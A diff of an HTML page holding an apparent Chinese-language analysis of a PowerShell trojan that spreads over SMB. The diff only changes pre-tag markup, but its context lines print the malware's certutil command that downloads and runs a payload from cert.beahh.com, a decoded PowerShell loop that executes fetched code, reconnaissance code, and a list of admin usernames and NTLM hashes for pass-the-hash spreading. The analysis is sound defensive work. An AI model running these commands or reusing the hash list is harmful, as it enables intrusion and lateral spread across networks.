@@ -91,13 +91,13 @@
 <p>病毒样本：</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x00.png" alt=""></p>
 <p>第一个动作，创建一个名为<code>Certificate</code>的任务计划，在七点开始，每隔一小时执行一次以下命令：</p>
-<pre><code>
+<pre tabindex="0"><code>
 cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&gt;nul&amp;expand -r v.dat&gt;nul&amp;v.bat&gt;nul&amp;del v.dat v.bat&gt;nul)
 
 </code></pre><p>由于目前<code>cert.beahh.com</code>已经无法访问，所以进行下一个powershell分析环节。</p>
 <p>首先，<code>powershell -nop -w hidden -ep bypass -e </code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。</p>
 <p>Windows中的powershell执行策略：</p>
-<pre><code>PS C:\Users\Rvn0xsy&gt; Get-ExecutionPolicy -List
+<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; Get-ExecutionPolicy -List
 
         Scope ExecutionPolicy
         ----- ---------------
@@ -109,7 +109,7 @@ MachinePolicy       Undefined
 </code></pre><p>将后面的base64解密后：</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x01.png" alt=""></p>
 <p>得到如下代码：</p>
-<pre><code>while($true)
+<pre tabindex="0"><code>while($true)
 {
 [System.Threading.Thread]::Sleep(200000);
 [string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
@@ -122,7 +122,7 @@ iex $c;
 </code></pre><p>外部是一个循环，将Sleep去除后，可以看到调用了<code>Invoke-Expression</code>，<code>Invoke-Expression</code>是一个能将变量的内容当作powershell表达式执行的函数。</p>
 <p>而iex只是<code>Invoke-Expression</code>的别名。</p>
 <p>下面简单演示几个例子：</p>
-<pre><code>PS C:\Users\Rvn0xsy&gt; iex &quot;Write-Host Rvn0xsy&quot;
+<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; iex &quot;Write-Host Rvn0xsy&quot;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt; Write-Host Rvn0xsy
 Rvn0xsy
@@ -130,7 +130,7 @@ PS C:\Users\Rvn0xsy&gt; Invoke-Expression &quot;Write-Host Rvn0xsy&quot;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt;
 </code></pre><p>将上述的木马脚本中iex替换成Write-Host即可：</p>
-<pre><code>while($true)
+<pre tabindex="0"><code>while($true)
 {
 
 [string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
@@ -152,9 +152,9 @@ Write-Host $c;
 <h3 id="解密第四层">解密第四层</h3>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x05.png" alt=""></p>
 <p>第四次好像混淆的更加厉害来，但是不影响我们的分析，先看首行：</p>
-<pre><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')((('[string]3CHav = U'+'ABUAB[string]....
+<pre tabindex="0"><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')((('[string]3CHav = U'+'ABUAB[string]....
 </code></pre><p>其中它是以<code>. (表达式)(表达式)</code>来执行的，于是我想到了另外一种函数调用的可能：</p>
-<pre><code>PS C:\Users\Rvn0xsy&gt; . Write-Host &quot;Rvn0xsy&quot;
+<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; . Write-Host &quot;Rvn0xsy&quot;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt;
 </code></pre><p>这样也能执行，所以我判断<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>就是<code>iex</code>或者<code>Invoke-Expression</code>，我将<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>改为<code>Write-Host</code>直接执行：</p>
@@ -164,7 +164,7 @@ PS C:\Users\Rvn0xsy&gt;
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x07.png" alt=""></p>
 <p><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code> = <code>Iex</code></p>
 <h2 id="0x03-行为分析">0x03 行为分析</h2>
-<pre><code>[string]$av = &quot;&quot;[string]$avs = &quot;&quot;[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
+<pre tabindex="0"><code>[string]$av = &quot;&quot;[string]$avs = &quot;&quot;[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
 ace root\SecurityCenter2 -Class AntiVirusProduct).displayNameif($avs.GetType().name.IndexOf('Object') -gt -1){for($v = 0; $v -lt $avs.Count; $v++){$av += $avs[$v] + &quot;|&quot;}}else{$av 
 = $avs}try{if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq &quot;Running&quot;){$av += 'ZDFY'}}catch{}#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum
  100000))$path = &quot;$env:temp\\ppp.log&quot;[string]$flag = test-path $path$key = &quot;&amp;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;ver=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObj
@@ -189,7 +189,7 @@ Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-P
 <p>3.端口扫描，全量1-65535、445、139都会扫描</p>
 <p>4.依赖于445 SMB服务进行传播</p>
 <p>其中，常用的Hash和用户名：</p>
-<pre><code>[string[]]$global:alluser = @(&quot;administrator&quot;,&quot;admin&quot;)[string[]]$global:allpass = @(&quot;32ed87bdb5fdc5e9cba88547376818d4&quot;,&quot;8846f7eaee8fb117ad06bdd830b7586c&quot;,&quot;7b592e4f8178b4c75788531b2e747687&quot;,&quot;3fa45a060bd2693ae4c05b601d05ca0c&quot;,&quot;69943c5e63b4d2c104dbbcc15138b72b&quot;,&quot;588feb889288fb953b5f094d47d1565c&quot;,&quot;3dbde697d71690a769204beb12283678&quot;,&quot;df54de3f3438343202c1dd523d0265be&quot;,&quot;7ce21f17c0aee7fb9ceba532d0546ad6&quot;,&quot;2d7f1a5a61d3a96fb5159b5eef17adc6&quot;,&quot;6103d9d963c57275dd3533674708e7be&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;af27efb60c7b238910efe2a7e0676a39&quot;,&quot;259745cb123a52aa2e693aaacca2db52&quot;,&quot;4057b60b514c5402dde3d29a1845c366&quot;,&quot;e8cd0e4a9e89eab931dc5338fcbec54a&quot;,&quot;f1351ac828428d74f6da2968089fc91f&quot;,&quot;b5fe2db507cc5ac540493d48fbd5fe33&quot;,&quot;12bdea0a1cb9486c067deaa851ac1609&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;b23a90d0aad9da3615fafc27a1b8baeb&quot;,&quot;a333f09e72c683f0205049d0db8b81fb&quot;,&quot;ad70819c5bc807280974d80f45982011&quot;,&quot;2d20d252a479f485cdf5e171d93985bf&quot;,&quot;0b6549421b2e7333e0e281f3ba5eea94&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;a80c9cc3f8439ada25af064a874efe2d&quot;,&quot;22315d6ed1a7d5f8a7c98c40e9fa2dec&quot;,&quot;b963c57010f218edc2cc3c229b5e4d0f&quot;,&quot;96880159e785de5314803b1169768900&quot;,&quot;8ec60adea316d957d1cf532c5841758d&quot;,&quot;c22b315c040ae6e0efee3518d830362b&quot;,&quot;7a21990fcd3d759941e45c490f143d5f&quot;,&quot;328727b81ca05805a68ef26acb252039&quot;,&quot;31c72c210ecc03d1eae94fa496069448&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;674e48b68c5cd0efd8f7e5faa87b3d1e&quot;,&quot;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;f2477a144dff4f216ab81f2ac3e3207d&quot;,&quot;62b26c13b70e7d5a9724710a41e63688&quot;,&quot;5835048ce94ad0564e29a924a03510ef&quot;,&quot;7773c08920232397cae081704964b786&quot;,&quot;a4141712f19e9dd5adf16919bb38a95c&quot;,&quot;b3ec3e03e2a202cbd54fd104b8504fef&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;162e829be112225fedf856e38e1c65fe&quot;,&quot;f67f5e3f66efd7298be6acd32eeeb27c&quot;)
+<pre tabindex="0"><code>[string[]]$global:alluser = @(&quot;administrator&quot;,&quot;admin&quot;)[string[]]$global:allpass = @(&quot;32ed87bdb5fdc5e9cba88547376818d4&quot;,&quot;8846f7eaee8fb117ad06bdd830b7586c&quot;,&quot;7b592e4f8178b4c75788531b2e747687&quot;,&quot;3fa45a060bd2693ae4c05b601d05ca0c&quot;,&quot;69943c5e63b4d2c104dbbcc15138b72b&quot;,&quot;588feb889288fb953b5f094d47d1565c&quot;,&quot;3dbde697d71690a769204beb12283678&quot;,&quot;df54de3f3438343202c1dd523d0265be&quot;,&quot;7ce21f17c0aee7fb9ceba532d0546ad6&quot;,&quot;2d7f1a5a61d3a96fb5159b5eef17adc6&quot;,&quot;6103d9d963c57275dd3533674708e7be&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;af27efb60c7b238910efe2a7e0676a39&quot;,&quot;259745cb123a52aa2e693aaacca2db52&quot;,&quot;4057b60b514c5402dde3d29a1845c366&quot;,&quot;e8cd0e4a9e89eab931dc5338fcbec54a&quot;,&quot;f1351ac828428d74f6da2968089fc91f&quot;,&quot;b5fe2db507cc5ac540493d48fbd5fe33&quot;,&quot;12bdea0a1cb9486c067deaa851ac1609&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;b23a90d0aad9da3615fafc27a1b8baeb&quot;,&quot;a333f09e72c683f0205049d0db8b81fb&quot;,&quot;ad70819c5bc807280974d80f45982011&quot;,&quot;2d20d252a479f485cdf5e171d93985bf&quot;,&quot;0b6549421b2e7333e0e281f3ba5eea94&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;a80c9cc3f8439ada25af064a874efe2d&quot;,&quot;22315d6ed1a7d5f8a7c98c40e9fa2dec&quot;,&quot;b963c57010f218edc2cc3c229b5e4d0f&quot;,&quot;96880159e785de5314803b1169768900&quot;,&quot;8ec60adea316d957d1cf532c5841758d&quot;,&quot;c22b315c040ae6e0efee3518d830362b&quot;,&quot;7a21990fcd3d759941e45c490f143d5f&quot;,&quot;328727b81ca05805a68ef26acb252039&quot;,&quot;31c72c210ecc03d1eae94fa496069448&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;674e48b68c5cd0efd8f7e5faa87b3d1e&quot;,&quot;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;f2477a144dff4f216ab81f2ac3e3207d&quot;,&quot;62b26c13b70e7d5a9724710a41e63688&quot;,&quot;5835048ce94ad0564e29a924a03510ef&quot;,&quot;7773c08920232397cae081704964b786&quot;,&quot;a4141712f19e9dd5adf16919bb38a95c&quot;,&quot;b3ec3e03e2a202cbd54fd104b8504fef&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;162e829be112225fedf856e38e1c65fe&quot;,&quot;f67f5e3f66efd7298be6acd32eeeb27c&quot;)
 </code></pre><p>SMB服务传播代码：</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x11.png" alt=""></p>
 <p>会上传启动项：<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code></p>
@@ -197,7 +197,7 @@ Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-P
 <p>该木马涵盖了Windows SMB客户端的所有代码，以及哈希传递技术的所有功能。</p>
 <p>代码有很多都是采用了Invoke-SMBClient。</p>
 <p>优先感染子网：</p>
-<pre><code>10.
+<pre tabindex="0"><code>10.
 172.
 192.168.
 </code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x12.png" alt=""></p>
